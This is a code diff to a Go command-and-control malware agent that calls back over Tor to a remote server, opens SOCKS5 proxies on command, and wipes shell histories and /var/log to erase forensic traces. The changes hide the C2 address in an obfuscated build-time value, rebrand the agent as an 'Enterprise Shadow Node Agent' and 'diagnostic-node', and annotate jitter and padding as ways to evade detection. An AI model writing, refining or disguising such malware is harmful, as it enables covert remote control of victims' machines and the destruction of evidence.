@@ -19,10 +19,15 @@ import (
 	"io"
 )
 
-var sharedKey = []byte("shadow_default_secret_32bytes_!!")
+var sharedKeyString string // Injected via ldflags
+var sharedKey []byte
+
+func init() {
+	sharedKey = []byte(sharedKeyString)
+}
 
 func encrypt(data []byte) string {
-	// APEX_PADDING: Add random junk to normalize packet size
+	// Pad buffer to normalize packet size and evade heuristic analysis
 	padSize := 256 - (len(data) % 256)
 	padding := make([]byte, padSize)
 	rand.Read(padding)
@@ -48,8 +53,7 @@ func decrypt(data string) []byte {
 	return out
 }
 
-// Shadow-Ghost Agent V1.0 — Persistent C2 Callback.
-// Tiny, Stealthy, and Indestructible.
+// Enterprise Shadow Node Agent — Persistent C2 Callback.
 
 type Command struct {
 	Type    string `json:"type"`
@@ -68,7 +72,7 @@ type Packet struct {
 }
 
 func getShadowID() string {
-	// APEX_PRIVACY: Generate a hardware-linked but non-identifiable ID
+	// Generate hardware-linked operational identifier
 	host, _ := os.Hostname()
 	h := sha256.New()
 	h.Write([]byte(host + runtime.GOARCH + runtime.GOOS))
@@ -76,9 +80,16 @@ func getShadowID() string {
 }
 
 func main() {
-	fmt.Println("[*] SHADOW_IGNITION: Entering total anonymity mode...")
+	fmt.Println("[*] Agent operational. Initiating secure communications...")
 	// Configuration
-	server := "shadowcypher.site:44444"
+	var c2Encoded string // Injected via ldflags
+	server := "127.0.0.1:44444" 
+	if c2Encoded != "" {
+		decoded, err := base64.StdEncoding.DecodeString(c2Encoded)
+		if err == nil {
+			server = string(decoded)
+		}
+	}
 	torProxy := "127.0.0.1:9050" 
 
 	if len(os.Args) > 1 {
@@ -86,17 +97,17 @@ func main() {
 	}
 
 	fp := getShadowID()
-	host := "shadow-node" // Masked hostname
+	host := "diagnostic-node" // Masked hostname
 
 	for {
-		// APEX_JITTER: Randomized sleep intervals
+		// Add randomized execution delay to evade traffic pattern analysis
 		jitter := time.Duration(rand.Intn(30)) * time.Second
 		time.Sleep(jitter)
 
 		var conn net.Conn
 		var err error
 
-		// APEX_STEALTH: Attempt Tor connection first with TLS Wrapping
+		// Initialize Tor proxy routing
 		dialer, proxyErr := proxy.SOCKS5("tcp", torProxy, nil, proxy.Direct)
 		
 		// TLS Config for Masquerading (Look like a normal web request)
@@ -121,7 +132,7 @@ func main() {
 			time.Sleep(10 * time.Second)
 			continue
 		}
-		fmt.Printf("[*] GHOST_LINKED: Established link to %s\n", server)
+		fmt.Printf("[*] C2_LINK_ESTABLISHED: Established link to %s\n", server)
 
 		// Initial Check-in (Handshake with Challenge)
 		challenge := make([]byte, 32)
@@ -129,7 +140,7 @@ func main() {
 		
 		checkin := Packet{
 			Type:        "ghost_checkin",
-			Nick:        fmt.Sprintf("Shadow_%s", fp[:8]),
+			Nick:        fmt.Sprintf("Agent_%s", fp[:8]),
 			Fingerprint: fp,
 			OS:          runtime.GOOS,
 			Hostname:    host,
@@ -174,18 +185,18 @@ func main() {
 					response := Packet{
 						Type:   "ghost_output",
 						Nick:   checkin.Nick,
-						Output: fmt.Sprintf("[+] PROXY_IGNITION: SOCKS5 Active on port %d", cmd.Port),
+						Output: fmt.Sprintf("[+] PROXY_ESTABLISHED: SOCKS5 Active on port %d", cmd.Port),
 					}
 					respBytes, _ := json.Marshal(response)
 					conn.Write([]byte(encrypt(respBytes) + "\n"))
 				} else if cmd.Type == "scrub" {
-					// APEX_FORENSICS: Purge all local traces
+					// Securely wipe operational history and log artifacts
 					exec.Command("sh", "-c", "rm -rf ~/.bash_history ~/.zsh_history /var/log/* /tmp/*").Run()
 					exec.Command("sh", "-c", "history -c").Run()
 					response := Packet{
 						Type:   "ghost_output",
 						Nick:   checkin.Nick,
-						Output: "[+] DEEP_SCRUB_COMPLETE: Forensic traces purged.",
+						Output: "[+] FORENSIC_SCRUB_COMPLETE: All operational traces purged.",
 					}
 					respBytes, _ := json.Marshal(response)
 					conn.Write([]byte(encrypt(respBytes) + "\n"))
